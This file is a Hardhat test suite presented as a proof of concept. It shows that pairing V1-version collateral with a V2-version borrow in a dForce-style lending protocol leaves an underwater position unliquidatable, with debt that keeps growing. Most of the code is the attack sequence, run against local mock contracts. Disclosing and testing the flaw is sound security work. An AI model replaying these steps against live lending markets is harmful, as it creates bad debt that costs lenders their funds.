import { expect } from "chai";
import { ethers } from "hardhat";
import { HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/signers";

const BASE = ethers.parseEther("1");
const CF = ethers.parseEther("0.9");
const BF = ethers.parseEther("1");
const SUPPLY_CAP = ethers.parseEther("1000000");
const BORROW_CAP = ethers.parseEther("1000000");

function fmt(v: bigint) {
  return ethers.formatEther(v);
}

describe("PoC - Mixed V1/V2 Markets Create Unliquidatable Bad Debt", function () {

  let deployer: HardhatEthersSigner;
  let attacker: HardhatEthersSigner;
  let liquidator: HardhatEthersSigner;
  let lender: HardhatEthersSigner;

  let underlyingA: any;
  let underlyingB: any;

  let iTokenA: any; // V1 collateral
  let iTokenB: any; // V2 borrow

  let controller: any;
  let oracle: any;

  let irmNoRate: any;
  let irmLowRateV1: any;
  let irmLowRateV2: any;

  async function addMarketV2(market: string) {
    await controller._addMarketV2({
      _iToken: market,
      _collateralFactor: CF,
      _borrowFactor: BF,
      _supplyCapacity: SUPPLY_CAP,
      _borrowCapacity: BORROW_CAP,
      _distributionFactor: 0n,
      _liquidationThreshold: CF,
      _sModeID: 0,
      _sModeLtv: 0n,
      _sModeLiqThreshold: 0n,
      _borrowableInSegregation: false,
      _debtCeiling: 0n
    });
  }

  beforeEach(async () => {
    [deployer, attacker, liquidator, lender] =
      await ethers.getSigners();

    const Token = await ethers.getContractFactory("Token");

    underlyingA = await Token.deploy(
      "Mock USDC",
      "USDC",
      18n
    );

    underlyingB = await Token.deploy(
      "Mock WETH",
      "WETH",
      18n
    );

    irmNoRate = await (
      await ethers.getContractFactory(
        "MockRateModelNoInterest"
      )
    ).deploy();

    await irmNoRate.setIsInterestRateModel(true);

    irmLowRateV1 = await (
      await ethers.getContractFactory(
        "MockLowRateModel"
      )
    ).deploy();

    irmLowRateV2 = await (
      await ethers.getContractFactory(
        "MockLowRateSecondModel"
      )
    ).deploy();

    oracle = await (
      await ethers.getContractFactory(
        "PriceOracleV2"
      )
    ).deploy(
      deployer.address,
      ethers.parseEther("0.1")
    );

    const extraImplicit = await (
      await ethers.getContractFactory(
        "ControllerV2ExtraImplicit"
      )
    ).deploy();

    const extraExplicit = await (
      await ethers.getContractFactory(
        "ControllerV2ExtraExplicit"
      )
    ).deploy();

    controller = await (
      await ethers.getContractFactory(
        "ControllerV2"
      )
    ).deploy(
      extraImplicit.target,
      extraExplicit.target
    );

    const Reward =
      await ethers.getContractFactory(
        "RewardDistributor"
      );

    const rewardDist =
      await Reward.deploy();

    await rewardDist.initialize(
      controller.target
    );

    await controller._setRewardDistributor(
      rewardDist.target
    );

    await controller._setPriceOracle(
      oracle.target
    );

    await controller._setCloseFactor(
      ethers.parseEther("0.5")
    );

    await controller._setLiquidationIncentive(
      ethers.parseEther("1.1")
    );

    const ITokenV1 =
      await ethers.getContractFactory("iToken");

    iTokenA = await ITokenV1.deploy();

    await iTokenA.initialize(
      underlyingA.target,
      "dForce USDC",
      "iUSDC",
      controller.target,
      irmNoRate.target
    );

    const ITokenV2 =
      await ethers.getContractFactory("iTokenV2");

    iTokenB = await ITokenV2.deploy();

    await iTokenB.initialize(
      underlyingB.target,
      "dForce WETH",
      "iWETH",
      controller.target,
      irmNoRate.target
    );

    await oracle.setPrice(iTokenA.target, BASE);
    await oracle.setPrice(iTokenB.target, BASE);

    await addMarketV2(iTokenA.target);
    await addMarketV2(iTokenB.target);

    const liquidity =
      ethers.parseEther("10000");

    await underlyingB.mint(
      lender.address,
      liquidity
    );

    await underlyingB.connect(lender)
      .approve(
        iTokenB.target,
        liquidity
      );

    await iTokenB.connect(lender)
      .mint(
        lender.address,
        liquidity
      );
  });

  async function createPosition(
    amount: bigint
  ) {
    const collateral =
      ethers.parseEther("100");

    await underlyingA.mint(
      attacker.address,
      collateral
    );

    await underlyingA.connect(attacker)
      .approve(
        iTokenA.target,
        collateral
      );

    await iTokenA.connect(attacker)
      .mint(
        attacker.address,
        collateral
      );

    await controller.connect(attacker)
      .enterMarkets(
        [iTokenA.target]
      );

    await iTokenB.connect(attacker)
      .borrow(amount);
  }

  it("V1 and V2 use different accrual units", async () => {

    const v1 =
      await iTokenA.getAccrualInterestUnit();

    const v2 =
      await iTokenB.getAccrualInterestUnit();

    console.log("\n=== Interest Unit Mismatch ===");
    console.log(
      "V1 accrual unit (block.number):",
      v1.toString()
    );
    console.log(
      "V2 accrual unit (block.timestamp):",
      v2.toString()
    );
    console.log(
      "Cross-version units are incompatible"
    );

    expect(v1).to.not.equal(v2);
  });

  it("Mixed V2 borrow + V1 collateral becomes unliquidatable", async () => {

    await createPosition(
      ethers.parseEther("80")
    );

    await iTokenB._setInterestRateModel(
      irmLowRateV2.target
    );

    await ethers.provider.send(
      "hardhat_mine",
      ["0x1F4"]
    );

    await iTokenB.updateInterest();

    const debt =
      await iTokenB.borrowBalanceStored(
        attacker.address
      );

    const [equity, shortfall] =
      await controller.calcAccountEquity(
        attacker.address
      );

    expect(shortfall).gt(0n);

    console.log("\n=== Underwater Position ===");
    console.log("Debt:", fmt(debt));
    console.log("Shortfall:", fmt(shortfall));
    console.log(
      "Underwater:",
      shortfall > 0n
    );

    const repay =
      ethers.parseEther("10");

    await underlyingB.mint(
      liquidator.address,
      repay
    );

    await underlyingB.connect(liquidator)
      .approve(
        iTokenB.target,
        repay
      );

    console.log(
      "Liquidation should succeed but is expected to revert"
    );

    await expect(
      iTokenB.connect(liquidator)
        .liquidateBorrow(
          attacker.address,
          repay,
          iTokenA.target
        )
    ).to.be.reverted;

    console.log(
      "Liquidation reverted -> position becomes unliquidatable bad debt"
    );
  });

  it("Control: same-version liquidation succeeds", async () => {

    console.log(
      "\n=== Control Test (V1/V1) ==="
    );

    const Token =
      await ethers.getContractFactory(
        "Token"
      );

    const underlyingC =
      await Token.deploy(
        "Mock DAI",
        "DAI",
        18n
      );

    const ITokenV1 =
      await ethers.getContractFactory(
        "iToken"
      );

    const iTokenC =
      await ITokenV1.deploy();

    await iTokenC.initialize(
      underlyingC.target,
      "dForce DAI",
      "iDAI",
      controller.target,
      irmNoRate.target
    );

    await oracle.setPrice(
      iTokenC.target,
      BASE
    );

    await addMarketV2(
      iTokenC.target
    );

    const liq =
      ethers.parseEther("10000");

    await underlyingC.mint(
      lender.address,
      liq
    );

    await underlyingC.connect(lender)
      .approve(
        iTokenC.target,
        liq
      );

    await iTokenC.connect(lender)
      .mint(
        lender.address,
        liq
      );

    await underlyingA.mint(
      attacker.address,
      ethers.parseEther("100")
    );

    await underlyingA.connect(attacker)
      .approve(
        iTokenA.target,
        ethers.parseEther("100")
      );

    await iTokenA.connect(attacker)
      .mint(
        attacker.address,
        ethers.parseEther("100")
      );

    await controller.connect(attacker)
      .enterMarkets(
        [iTokenA.target]
      );

    await iTokenC.connect(attacker)
      .borrow(
        ethers.parseEther("80")
      );

    await iTokenC._setInterestRateModel(
      irmLowRateV1.target
    );

    await ethers.provider.send(
      "hardhat_mine",
      ["0x1F4"]
    );

    await iTokenC.updateInterest();

    await underlyingC.mint(
      liquidator.address,
      ethers.parseEther("10")
    );

    await underlyingC.connect(liquidator)
      .approve(
        iTokenC.target,
        ethers.parseEther("10")
      );

    await expect(
      iTokenC.connect(liquidator)
        .liquidateBorrow(
          attacker.address,
          ethers.parseEther("10"),
          iTokenA.target
        )
    ).to.not.be.reverted;

    console.log(
      "Same-version liquidation succeeds"
    );
  });

  it("Bad debt grows while liquidation remains impossible", async () => {

    await createPosition(
      ethers.parseEther("80")
    );

    await iTokenB._setInterestRateModel(
      irmLowRateV2.target
    );

    console.log(
      "\n=== Bad Debt Growth ==="
    );

    const checkpoints = [
      10,50,100,200,500
    ];

    let mined = 0;
    let reachedBadDebt = false;

    for (const target of checkpoints) {

      await ethers.provider.send(
        "hardhat_mine",
        [`0x${(target-mined).toString(16)}`]
      );

      mined = target;

      await iTokenB.updateInterest();

      const debt =
        await iTokenB.borrowBalanceStored(
          attacker.address
        );

      const [,sf] =
        await controller.calcAccountEquity(
          attacker.address
        );

      let liquidatable = true;

      try {
        await iTokenB.connect(liquidator)
          .liquidateBorrow.staticCall(
            attacker.address,
            ethers.parseEther("1"),
            iTokenA.target
          );
      } catch {
        liquidatable = false;
      }

      console.log(
`${target} blocks | debt=${fmt(debt)} | shortfall=${fmt(sf)} | liquidatable=${liquidatable}`
      );

      if (sf > 0n) {
        reachedBadDebt = true;
      }

      expect(liquidatable).eq(false);
    }

    expect(reachedBadDebt).eq(true);

    console.log(
      "Bad debt threshold reached"
    );

    console.log(
      "\nResult: debt continues increasing while liquidation remains permanently blocked"
    );
  });

});